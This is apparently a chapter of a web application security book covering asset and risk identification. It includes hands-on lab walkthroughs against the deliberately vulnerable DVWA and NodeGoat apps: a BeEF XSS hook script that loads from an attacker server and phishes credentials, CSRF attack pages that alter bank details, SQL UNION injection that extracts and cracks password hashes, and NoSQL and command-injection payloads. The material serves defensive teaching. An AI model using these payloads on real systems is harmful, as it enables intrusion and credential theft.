# 10. Web Applications {#web-applications}

![10,000' view and lower of Web Application Security](images/10000WebApp.png)

I had the pleasure of interviewing [Zane Lackey](https://twitter.com/zanelackey) on Software Engineering Radio for a [show on Application Security](http://www.se-radio.net/2017/11/se-radio-episode-309-zane-lackey-on-application-security/), this is well worth listening to.

## 1. SSM Asset Identification
Take the results from the higher level Asset Identification in the 30,000' View chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Remove any that are not applicable, add any that are relevant from previous chapters, and add any newly discovered. Here are some to get you started:

{#web-applications-asset-identification-ownership}
* Ownership (as addressed in the VPS chapter). Do not assume that you will always have ownership, or at least have control of your server(s). An attacker will often attempt to target ownership, as one of the first assets, in order to execute further exploits. This may sound strange, based on your likely assumption, that you will always own (have control of) your web application. Hopefully, I have dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it), then they have a foot hold to launch further attacks, and can gain access to other assets of greater value. The web application itself can be a stepping stone for the attacker to other assets that you assumed were safe. With this in mind, your web application is an asset, or you could think of it as a liability, both may be correct. Regardless, you need to protect your web application, and build in the capacity for self-preservation. I have covered this under the [Insufficient Attack Protection](#web-applications-countermeasures-insufficient-attack-protection) section
* As noted in the [Asset Identification](#vps-asset-identification) section in the VPS chapter, visibility is an asset that is also up for grabs
* Intellectual property or sensitive information within the code, or configuration files such as email addresses, and account credentials for the likes of datastores, syslog servers, monitoring services. We address this in [Management of Application Secrets](#web-applications-identify-risks-management-of-application-secrets)
* Sensitive Client/Customer data.
* Sanity and peace of mind of people within your organisation, including people who are:
  * Well informed
  * Do not cut corners that should not be cut
  * Passionate and driven to be their best
  * Smart
  * Humble, yet fearless
  * Recognise technical debt, and are professional enough to speak up
  * Engaged, and love passing on their knowledge to others (this is truly an asset)  
  Some of the following risks will threaten the sanity of these people if countermeasures are not employed.

## 2. SSM Identify Risks
Go through the same process as we did at the top level, in the 30,000' View chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com), but for Web Applications. [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008) is also useful.

The following are the OWASP Top 10 vulnerabilities for 2003, 2004, 2007, 2010, 2013 and 2017.

&nbsp;

![](images/OWASPTop10OverTime.png)

&nbsp;

As you can see, there are vulnerabilities we continuously fail to remove. I have listed them in order from most to least consistently addressed:

1. Injection (and the easiest to fix)
2. Broken Authentication and Session Management
3. XSS
4. Insecure Direct Object References
5. Missing Function Level Access Control
6. We have gotten a little better at reducing CSRF with using the likes of the synchroniser token pattern, and possibly using LocalStorage more than cookies

I think we are going to see "Using Components with Known Vulnerabilities" get worse before it gets better, due to the fact that we are now consuming a far greater amount of free and open source packages and repositories. With the increased consumption of these packages and repositories, such as NPM, NuGet and various others, we are now consuming them without vetting them before including them in our projects. We are trying to achieve more, with less of our own work, it's more to do with how, in many cases, we are blindly trusting other sources. From the attacker's perspective, this is an excellent vector to compromise for maximum exploitation. This is why I've devoted a set of sections within this chapter to this problem, called "Consuming Free and Open Source". There are also other sections devoted to this topic in the VPS and Network chapters titled "Using Components with Known Vulnerabilities".

### Lack of Visibility

With the lack of visibility, I see this as an indirect risk to the asset of [web application ownership](#web-applications-asset-identification-ownership). The same sections in the VPS and Network chapters may also be worth reading, if you have not already, as there is some crossover.

A lack of application introspection at any given time, or being able to track its health status, is not a comfortable place to be. There is no reason to be in this state.

#### Insufficient Logging and Monitoring

![](images/ThreatTags/average-widespread-veryeasy-moderate.png)

Can you, at any point in time, tell if someone or something is:

* Using your application in a way that it was not intended to be used
* Violating policy. For example, circumventing client side input sanitisation.

How easy is it for you to notice:

* Poor performance and potential DoS?
* Abnormal application behaviour or unexpected logic threads
* Logic edge cases and blind spots that stake holders, Product Owners, and Developers have missed?
* Any statistics that may be helpful in diagnosing any application specific issue

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-identify-risks-lack-of-input-validation-and-sanitisation}
![](images/ThreatTags/average-verywidespread-average-moderage.png)

#### Generic

The risks here are specific to accepting untrusted data and parsing it, rendering it, executing it, or storing it verbatim to have the same performed on it at a later stage. 

The further you get from your back-end executing code the more you move into untrusted territory. If your back-end is in the cloud, territory you don't control, i.e. it's not your hardware or staff running it, then you may have serious potential issues there to address. I've discussed in depth what these issues are in previous chapters, and how to mitigate these risks. Basically, anywhere outside of your local network is untrusted. Inside your local network is semi-trusted. The amount of trust you afford depends on the relationships you have with your staff, and/or how large your staff base is. Including the size of your network, how access points are managed, and many of the other issues I have discussed in previous chapters, including Physical and People from [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). The closer data gets to the executing back-end code, the less untrustworthy it can be considered. Of course, there are many exceptions to this rule as well. I discus this in depth in the podcast shows I hosted for Software Engineering Radio: [Cloud Security](http://www.se-radio.net/2018/01/se-radio-episode-314-scott-piper-on-cloud-security/) and [End to End Encryption](http://www.se-radio.net/2018/04/se-radio-episode-321-peter-budai-on-end-to-end-encryption/)

I could just say don't trust anyone or anything, but there comes a time and a place that you must afford trust. Just keep it as close to the back-end executing code as possible.

Today, the web stack is very complicated. We have URLs, CSS, JavaScript, XML and its derivatives, templating languages, and frameworks. Most of these languages have their own encoding, quoting, commenting, escaping, where most of which can be nested inside of each other. This makes the web browser a very treacherous place in terms of security. Browsers succeed on their ability to interpret all of this. All scripts have the same level of privilege within the browser.

This overly complex environment leads to confusion, and becomes an effective location for hiding malicious code.

Below are a few widely accepted techniques which we should use on any untrusted data before it makes its way through your system to be stored or hydrated.

##### What is Validation {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation}

Decide what input is valid by way of a white list (list of allowed input characters). Often each input field will have a different white list. Validation is binary, the data is either allowed or denied. If it is not allowed, then it is rejected. It is usually not too complicated differentiating good from bad, and what is and isn't rejected. There are a few strategies to use for white listing, such as the collection of characters, or using regular expressions.

There are other criteria that you can validate against as well, such as:

* Field lengths
* Whether or not something is required
* Whether or not something is a specific type, or in a specific format
* Many other criteria

{title="Validation", linenos=off, lang=JavaScript}
    // The NodeJS module express-form provides validation, filtering
    // and some light weight sanitisation as Express middleware.
    var form = require('express-form');
    var fieldToValidate = form.field;

    // trim is filtering.
    fieldToValidate('name').trim().
    // required is validation.
    required().
    // minLength is validation.
    minLength(2).
    // maxLength is validation.
    maxLength(50).
    // is is validation.
    is(/^[a-zA-Z ']+$/)
    // There is no sanitisation here.

##### What is Filtering {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering}

Filtering represents when data can pass through (be received) or is captured by the filter element (thou shalt not pass). OWASP has the RSnake donated seminal [XSS cheat sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which has many tests on it that you can use to check your vulnerability to XSS exploitation. This is highly recommended.

##### What is Sanitisation {#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation}

Sanitisation is where input data (whether it is in your white list or not) is accepted and transformed into a medium that is no longer dangerous. This commonly goes through validation first. Sanitise character signatures (may be more than single characters, character combinations) not in your white list as a defence in depth strategy. The white list may change in the future due to a change in business requirements, and the developer may forget to revise the sanitisation routines. Think of security measures as standing on their own when you create them, but standing alongside, and often depending, on many other security measures once completed.

Know which contexts your input data will pass through in order to sanitise correctly for all potential execution contexts. This requires lateral thinking, and following all execution paths, including both input and output application paths (once rehydrated) as data is pushed back to the client. We cover this in depth below in the ["Example in JavaScript and C#"](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp) section in the countermeasures.

#### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}

The following hands-on demonstration of a cross-site scripting (XSS) attack provides insight into the damage it can cause.

A XSS attack is one in which untrusted data enters a web application, usually through a web request, and is allowed to execute without validation, filtering, or sanitisation. Data is then, at some point, sent to someone else (the adversary) using the same web application without being validated, filtered or sanitised.  
The input data in question, usually JavaScript, HTML or Flash, is executed by the browser. What the code does is up to the creativity of the initiator.

This can be carried out trivially when buying advertisements that inject malicious code via the end user's browser session. Malicious code can be easily hidden in the manner by simply changing additional scripts that are fetched, once live, even going so far as to fetch a script that fetches yet another script under the attacker's control.

The two common types of XSS are Stored/Persistent (Type I) and Reflected/Non-Persistent (Type II).  
Stored attacks are injected code sent to the server and stored in a medium that the web application uses to retrieve it again to send to another user.  
Reflected attacks use the web application in question as a proxy. When the user makes a request, the injected code travels from another medium through the web application (hence reflection) to the end user. From the browser's perspective, the injected code came from the web application the user made a request to.

{#wdcnz-demo-1}
![](images/HandsOnHack.png)

The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The subsequent attack was a credential harvest based on a spoofed website that was hypothetically fetched via a spear phishing attack. That particular attack can be found in the "Spear Phishing" section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com).

Theoretically, in order to achieve readiness for this attack, you would have executed several stages first. If you are carrying out a penetration testing engagement, it is likely you would have completed the following:

1. Information gathering (probably partly even before you signed the contract with your client)
2. Vulnerability scanning
3. Vulnerability searching

If you are working within a development team, you may have found other ways that your project was vulnerable to XSS.

Regardless, you are going to want to exhibit the fault. One of the most effective ways to do this, is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope, and is an excellent tool for effortlessly demonstrating the severity of the fault to all of your team members and stakeholders.  
One of BeEF's primary reasons for existence is to exploit the fact that many security philosophies seem to forget: how easy it is to go straight through hardened network perimeters, and attack the soft insides of a sub network, as discussed in the Fortress Mentality section of the Physical chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Exposing XSS faults is one of BeEFs attributes. 

You can find the video of how this attack is played out at [http://youtu.be/92AWyUfJDUw](http://youtu.be/92AWyUfJDUw).

I> ## Synopsis
I>
I> In this exercise, I used the Damn Vulnerable Web App (DVWA) as it intentionally exposes the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website, and send them to our BeEF communications server unknowingly.

{icon=bomb}
G> ## The Play
G>
G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.
G>
G> Open another browser tab and log-in to the DVWA.
G>
G> Browse to "XSS stored".
G>
G> Enter some text in the Name and Message fields.
G> 
G> Enable Foxy Proxy so that your request goes to the same port that Burp Suite is going to be listening on.
G>
G> Initialise Burp.
G>
G> Back in DVWA, send your request by clicking on the Sign Guest-book button.
G>
G> Switch back to the Burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
G>
G> You can now disable FoxyProxy too.
G>
G> Now on your victim's system, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victim's browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
G>
G> If you open the victim's browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
G>
G> In the BeEF web UI you can explore the modules that you can launch against the victim's browser. You can review the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
G>
G> Select the victim's node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even just selecting the Facebook default, if you know your target is already an avid FB user, should work fine. You would, of course, know this if you have done due diligence in the reconnaissance stage.

{icon=bomb}
G> Click on the Execute button and on the next Request -> Response from the hook.js, the victim's browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and log in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  

### [Cross-Site Request Forgery (CSRF)](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#General_Recommendation:_Synchronizer_Token_Pattern) {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-csrf}
![](images/ThreatTags/average-uncommon-easy-moderate.png)

This type of attack depends on a fraudulent web resource; it could be a website, email, instant message, or program that causes the target's web browser to perform an unintentional action on a website that the target is currently authenticated with.

CSRF attacks target functionality that change state on the server (`POST`, `PUT`, `DELETE`) that the target is currently authenticated to. This includes requests such as changing the target's credentials, making a purchase, moving money at their bank, etc. Forcing the target to retrieve data does not typically help the attacker in this scenario.

If you are using cookies (authentication that the browser automatically sends from the client) for storage of client-side session artifacts, CSRF is your main concern, but XSS is also a possible attack vector. 

The target needs to submit the request, either intentionally or unintentionally. The request could appear to the target as any action. For example:

1. Intentionally, by clicking a button on a website that does not appear to have anything in common with the website that the target is already authenticated with by way of Session Id stored in a cookie
2. Unintentionally, by loading a page not appearing to have anything in common with the website that the target is already authenticated with by way of Session Id stored in a cookie, that, for example, contains an `<iframe>` with a form and a script block inside
 
**For No. 1 above**, the action attribute of the form the target submits could be to the website that the target is already authenticated with, thus a fraudulent request is issued from a web page seemingly unrelated to the website that the target is already authenticated with. This can be seen in the second example below on line 4. The browser plays its part and sends the session Id stored in the cookie. NodeGoat has an excellent example attack step by step:

Below code can be found at [https://github.com/OWASP/NodeGoat/](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/views/profile.html):

{title="Snippet from legitimate profile.html", id="profile_html", linenos=on, lang=html}
    <form role="form" method="post" action="/profile">
       <div class="form-group">
          <label for="firstName">First Name</label>
          <input
             type="text"
             id="firstName"
             name="firstName"
             value="{{firstName}}"
             placeholder="Enter first name">
       </div>
       <div class="form-group">
          <label for="lastName">Last Name</label>
          <input
             type="text"
             id="lastName"
             name="lastName"
             value="{{lastName}}"
             placeholder="Enter last name">
       </div>
       <div class="form-group">
          <label for="ssn">SSN</label>
          <input
             type="text"
             id="ssn"
             name="ssn"
             value="{{ssn}}"
             placeholder="Enter SSN">
       </div>
       <div class="form-group">
          <label for="dob">Date of Birth</label>
          <input
             type="date"
             id="dob"
             name="dob"
             value="{{dob}}"
             placeholder="Enter date of birth">
       </div>
       <div class="form-group">
          <label for="bankAcc">Bank Account #</label>
          <input
             type="text"
             id="bankAcc"
             name="bankAcc"
             value="{{bankAcc}}"
             placeholder="Enter bank account number">
       </div>
       <div class="form-group">
          <label for="bankRouting">Bank Routing #</label>
          <input
             type="text"
             id="bankRouting"
             name="bankRouting"
             value="{{bankRouting}}"
             placeholder="Enter bank routing number">
          <p class="help-block">
             Must be entered as digits with a suffix of #. For example: 0198212# </p>
       </div>
       <div class="form-group">
          <label for="address">Address</label>
          <input
             type="text"
             id="address"
             name="address"
             value="{{address}}"
             placeholder="Enter address">
       </div>
       <input type="hidden" name="_csrf" value="{{csrftoken}}" />
       <button type="submit" class="btn btn-default" name="submit">Submit</button>
    </form>

The attack code below can be found at the NodeGoat [tutorial for CSRF](https://nodegoat.herokuapp.com/tutorial/a8), along with the complete example that ckarande crafted, as well as an accompanying tutorial video of how the attack plays out:

{title="Snippet from attackers website", linenos=off, lang=html, linenos=on}
    <html lang="en">
    <head></head>
       <body>
          <form method="POST" action="http://TARGET_APP_URL_HERE/profile">
             <h1> You are about to win a brand new iPhone!</h1>
             <h2> Click on the win button to claim it...</h2>
             <!--User is authenticated, let's force them to change some values-->
             <input type="hidden" name="bankAcc" value="9999999"/>
             <input type="hidden" name="bankRouting" value="88888888"/>
                                <input type="submit" value="Win !!!"/>
          </form>
       </body>
    </html>

**For No. 2 above**, it is similar to No. 1, but the target does not have to take any action once the fraudulent web page is loaded. The script block submits the form automatically, thus making the request to the website that the target is already authenticated with. The browser again plays it's part in sending the Session Id stored in the cookie:

{title="Snippet from attackers website", linenos=off, lang=html}
    <form id="theForm" action="http://TARGET_APP_URL_HERE/profile" method="post">
       <input type="hidden" name="bankAcc" value="9999999"/>
       <input type="hidden" name="bankRouting" value="88888888"/>
                                <input type="submit" value="Win !!!"/>
    </form>
    <script type="text/javascript">
       document.getElementById('theForm').submit();
    </script>

Some misnomers:

* A form is not essential to carry out CSRF successfully
* XSS is not essential to carry out CSRF successfully
* HTTPS does nothing to defend against CSRF

### Injection
![](images/ThreatTags/easy-common-average-severe.png)

Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can cause the interpreter to execute commands that would not otherwise execute, or gain access to data without the correct authorization.

In order for injection attacks to be successful, untrusted data must be unsuccessfully validated, filtered, and sanitised before it reaches the interpreter. In worst case scenarios, due to horrible security practices, untrusted data isn't validated, filtered, or unsanitised at all.

Injection defects are often easy to discover simply by examining the code that handles untrusted data, including internal data. These same defects are often harder to discover when blackbox testing, either manually or via fuzzers. Defects [can range](https://www.owasp.org/index.php/Injection_Flaws) from trivial to complete system compromise.

As part of the discovery stage, the attacker can test their queries to start enumerating what they think the underlying structure looks like. Then, with any number of useful on-line query test tools, such as [freeformatter.com](http://www.freeformatter.com/), the attacker can keep the signal to noise ratio as low as possible.

#### SQLi {#web-applications-identify-risks-sqli}

![](images/HandsOnHack.png)

One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it remains at the top of vulnerability lists. I am going to hammer this home some more. Also checkout the [podcast I hosted](https://binarymist.io/publication/ser-podcast-network-security/) with [Haroon Meer](https://twitter.com/haroonmeer) as a guest on Network Security for Software Engineering Radio, where Haroon discussed using SQLi for data exfiltration.

I> ## Synopsis
I>
I> I have used the Damn Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications [VM](http://sourceforge.net/projects/owaspbwa/files/) for this exercise. You can load this VM in a VMware product, or add the virtual machine disk to a new VM in VirtualBox. It's an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it's sandboxed from the rest of your network. You really don't want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.
I>
I> Start the machine.

{icon=bomb}
G> ## The Play
G>
G> In your Kali Linux box, run owasp-zap.  
G> If Chromium is not already running, run it and setup FoxyProxy for Chrome using the Burp Proxy we set-up in the Tooling Setup chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Zap is now recording your browsing.
G>
G> Once you have started the VM and browsed to it, select the DVWA and log in as  
G> user: "user", password "user". Make sure the Security Level is set to low.
G>
G> Navigate to the SQL Injecton page and enter `1` in the input box.
G>
G> In Zap: Right click on DVWA -> Attack -> Active Scan -> Start Scan
G>
G> When the scan has finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
G> See where Zap used a union query, but the response said "The used SELECT statements have a different number of columns". This means that if we use the correct number of columns we will have success.  
G>
G> In Request tab, select Input Parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. Then select jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
G>
G> Notice the `x' OR full_name LIKE '%bob%` in the Fuzzer tab?
G>
G> Then try the following in DVWA input:
G>
G> `x' OR full_name LIKE '%bob%`  
G> Output: Tells us we are in a `WHERE` clause, and I had an unknown column name.  
G> Thanks, MySQL error reporting!
G>
G> Try the following queries:  
G> `x' OR first_name LIKE '%bob%`     # This works  
G> `x' OR last_name LIKE '%smith%`    # This works  
G> `x' OR first_name LIKE '%`         # And as expected, we get what we think are all users.
G>
G> The recon stage may tell us a lot about naming conventions, and more. Once you know who the target organisation's employees are:  
G> Search stackoverflow, github, etc. for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
G> As we try different things, we learn more about naming conventions.  
G> You may also be able to find out about the target organisation's naming conventions by looking around the Internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.
G>
G> `x' OR user LIKE '%`               # This works  

{icon=bomb}
G> I thought the query on the server looked something like this:  
G> `SELECT ID, first_name, last_name FROM users WHERE ID = ''`
G>
G> Time to work out what the table name is.
G>
G> Let's try users. I'm thinking that the full query will look like:  
G> `SELECT ID, first_name, last_name FROM users WHERE ID = '1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%`  
G> Output: Unknown column 'ID'  
G> Let's fix that:  
G> `1' UNION SELECT user_id, first_name, last_name FROM users WHERE first_name LIKE '%`  
G> Output: "The used SELECT statements have a different number of columns"  
G> This told me that the query on the server was slightly different than what I thought. My revised guess of the full query:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%`
G>
G> Now for the passwords:  
G> Full server query guess:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%`
G>
G> Let's determine the hash type with hash-identifier. Just run the tool, and feed the hash to it. It will tell you that it is most likely a simple MD5, which is a one-way hashing function with no key derivation. It is so very easy to crack.
G>
G> Then take your pick of the following three commands:  
G> Create `~/hashtocrack.txt` and put the hash(s) you want cracked in it. Usually you would create a profiled wordlist tailored to your target as we did in the Password Profiling section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). For this exercise, just add the following four words to `~/wordlist-to-throw-at-dvwa`:  
G> `dogs`, `cats`, `admins`, `admin`. Now you can compare the hashed words from the list with the hash in the `~/hashtocrack.txt`

{icon=bomb}
G> 1. `hashcat -m 0 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa`  
G>    `-m 0` means MD5 to hashcat.  
G> 2. `[algorithm]` for next command in this case will be `MD5`  
G>    `findmyhash [algorithm] -h <hash_value>`  
G>    `findmyhash` is a cracker that queries online lists.  
G> 3. `john --format=raw-MD5 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa --show`
G>
G> This gives us the "super secure" password of "admin"  
G>
G> In order to login, we need the username. In this case they were the same, but for some other users they were not. So our last query.  
G> Full server query guess:  
G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users WHERE first_name LIKE '%'`  
G> Inject query:  
G> `1' UNION SELECT user, password FROM users WHERE first_name LIKE '%`  
G> Or simplified:  
G> `1' UNION SELECT user, password FROM users#'`
G> Now we have our admin password and user.

There are two main problems here.

1. SQL Injection
2. Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section, and even more so the [Countermeasures](#web-applications-countermeasures-data-store-compromise) section. Do not follow this example of bad practise. Use well salted and quality, strong key derivation functions (KDFs) on all of the sensitive data in your own projects.

#### NoSQLi {#web-applications-identify-risks-nosqli}

NoSQL Injection is semantically very similar to SQL Injection and Command Injection with JavaScript on vulnerable servers. The main differences are in the syntax of the attack.

NoSQL data stores often provide greater performance and scaling benefits, but in terms of security, they are at a disadvantage due to far fewer relational and consistency checks.

There are currently [over 225 types of NoSQL](http://nosql-database.org/) data stores, and each one does things differently. This means that if we only considered the number of NoSQL systems as compared to SQL, then the likelihood of confusion specific to safe queries for any given NoSQL engine has increased dramatically. There is also more room for an attacker to move within NoSQL queries than with SQL due to being heavily dependent on JavaScript, which is a dynamic, loosely typed general purpose language rather than the far more tightly constrained declarative SQL.

Because there are so many types of NoSQL data stores, crafting the attacks is often implementation specific, and due to that, the countermeasures are also implementation specific, making it even more work to provide a somewhat secure environment for your untrusted data to pass through. It often feels as if there is no safe passage.

NoSQL data store queries are usually written in the programming language of the application, or buried within an API of the same language. Often, the ubiquitous JavaScript is used, which can be executed in the Web UI, the server-side code if it is JavaScript, and then the particular type of NoSQL data store. Therefore, there are many more execution contexts that can be attacked.

I can not possibly cover all of the types of NoSQL data stores, below is an example specific to mongodb. 

A typical SQL query used to select a user based on their username and password might look like the following:

{linenos=off, lang="SQL"}
    SELECT * FROM accounts WHERE username = '$username' AND password = '$password'

If the `$username` and `$password` fields were not properly validated, filtered, and sanitised, an attacker could supply  
`admin' --`  
as the username and the resulting query would look like:

{linenos=off, lang="SQL"}
    -- As you can see, the password is no longer required,
    -- as the rest of the query is commented out.
    SELECT * FROM accounts WHERE username = 'admin' --' AND password = ''

The equivalent of a MongoDB query could be:

{linenos=off}
    db.accounts.find({username: username, password: password});

One way an attacker could attempt to bypass the password, if the untrusted data was not being validated, would be to supply a username of:  
`admin`  
and a password of:  
`{$gt: ""}`  

The resulting query would then look like:

{linenos=off}
    {username: "admin", password: {$gt: ""}}

The MongoDB [`$gt` comparison operator](https://docs.mongodb.com/manual/reference/operator/query/gt/#op._S_gt) is used here to select those documents where the value of the password is greater than `""`, which always results in true because empty passwords are not permitted. Check the [NodeGoat tutorial](https://nodegoat.herokuapp.com/tutorial/a1) for additional information.

#### Command Injection {#web-applications-identify-risks-command-injection}

The following examples target JavaScript running on the server. If your application on the server is written in some other language, then the attacker just needs to supply code in that language for it to be executed.

The following functions are easily exploited by an attacker by simply supplying the code they want to execute as a string of text input:

The JavaScript [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function executes the string of code passed to it with the privileges of the caller.

The JavaScript [`setTimeout`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout) and [`setInterval`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval) functions allow you to pass a string of code as the first argument, which is compiled and executed on timer expiration (with `setTimeout`), and at intervals (with `setInterval`).

The JavaScript [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor takes an arbitrary number of string arguments which are used as the formal parameter names within the function body that the constructor creates. The last argument passed to the `Function` constructor is also a string, but it contains the statements that are to be executed as the `Function` object that is returned.

The purposely vulnerable Node Web Application NodeGoat provides some simple examples in the form of executable [code](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L24-L26) including some absolute bare minimum countermeasures. There's also a [tutorial](https://nodegoat.herokuapp.com/tutorial/a1) with videos of Command Injection in the form of a Denial of Service (DoS), by passing  
`while(1)`  
or  
`process.exit()`  
or  
`process.kill(process.pid)`  
through some input fields of the Web UI. It also covers discovery of the names of the files on the target web servers file system:

{title="Reveal directory contents", linenos=off, lang=JavaScript}
    // Read the contents of the current directory.
    res.end(require('fs').readdirSync('.').toString());
    // Read the contents of the parent directory.
    res.end(require('fs').readdirSync('..').toString());

{title="Reveal file contents", linenos=off, lang=JavaScript}
    res.end(require('fs').readFileSync(filename));

The attacker can further this attack by writing new files and executing files on the server.

Many web applications take untrusted data, often from HTTP requests, and pass this data directly to the operating system, its programs, or even other systems, often by APIs. This is now addressed by the OWASP Top 10 [A10 Under protected APIs](https://www.owasp.org/index.php/Top_10_2017-A10-Underprotected_APIs)

Also, check out the Additional Resources chapter for [command injection](#additional-resources-web-applications-risks-injection-command-injection) attack techniques.

#### XML Injection {#web-applications-identify-risks-xml-injection}

XML injection techniques usually consist of a discovery stage, followed by full exploitation, if successful:

1. Attempting to create invalid XML document by injecting various [XML metacharacters](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Discovery) (metacharacter injection):
  * Single quotes: `'`
  * Double quotes: `"`
  * Angle brackets: `><`
  * Comment tags: `<!--` and `-->`
  * Ampersand: `&`
  * CDATA section delimiters: `<![CDATA[` and `]]>` allowing an attacker to form executable code
2. Injecting an untrusted XML document which is accepted and not contextually validated, filtered or sanitised by the parser, assuming XML documents are accepted. One can also exploit the XML parser that is configured to resolve, validate and process external entities in the form of Document Type Definitions (DTDs) and XML Schema Definitions (XSDs). This is known as [XML External Entity](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) (XXE) exploitation
3. Attempting to modify the XML structure by injecting various XML data and Tags ([tag injections](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Tag_Injection)) and witnessing how the parser deals with the data

There are a number of XML attack categories exploitable via injection that target weaknesses.

At the 2017 [OWASP New Zealand Day](https://www.owasp.org/index.php/OWASP_New_Zealand_Day_2017#tab=Presentation_Schedule) conference, Adam Bell presented "XML Still Considered Dangerous" covering the following:

* Parameter expansion
* XML External Entities (XXE)
* URL Invocation

Check out Adam's [slide-deck](https://www.owasp.org/images/4/48/2017-04-20-OWASPNZ-XMLDangerous.pdf) on the OWASP NZ Day wiki for some interesting examples.

#### [XSLT Injection](https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf) {#web-applications-identify-risks-xslt-injection}

A lot can go wrong with Extensible Stylesheet Language Transformations (XSLT); following is a collection of some of the vulnerabilities to be aware of:

* Leveraging XPath to refer to parts of XML documents
* Susceptible to XXE of local and remote files, as well as include additional arbitrary XSL files
* Extract system information including file contents
* Port scanning
* Write files to file system
* Access of arbitrary databases
* Execution of arbitrary code

#### XPath Injection {#web-applications-identify-risks-xpath-injection}

